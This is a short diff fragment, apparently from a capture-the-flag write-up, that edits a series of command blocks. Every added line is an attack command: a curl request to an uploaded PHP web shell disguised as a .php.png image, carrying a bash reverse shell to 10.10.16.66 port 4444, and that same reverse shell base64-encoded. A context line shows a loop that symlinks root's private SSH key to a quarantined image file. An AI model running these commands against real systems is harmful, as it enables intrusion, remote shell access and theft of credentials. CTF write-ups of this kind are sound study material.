@@ -29,19 +29,19 @@ while true;do ln -sf /root/.ssh/id_rsa /var/quarantined/key.png;done
 ```
 
 ```
-export CHECK_CONTENT=true; sudo /usr/bin/bash /opt/ghost/clean_symlink.sh /opt/ghost/content/images/key.png
+curl -G --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.16.66/4444 0>&1"' http://10.129.227.126/uploads/10_10_16_66.php.png
 ```
 
 ```
-
+uploads/10_10_16_66.php.png?cmd=
 ```
 
 ```
-
+echo -n 'bash -c "bash -i >/dev/tcp/10.10.16.66/4444 0>&1"' | base64
 ```
 
 ```
-
+YmFzaCAtYyAiYmFzaCAtaSA+L2Rldi90Y3AvMTAuMTAuMTYuNjYvNDQ0NCAwPiYxIg==
 ```
 
 ```
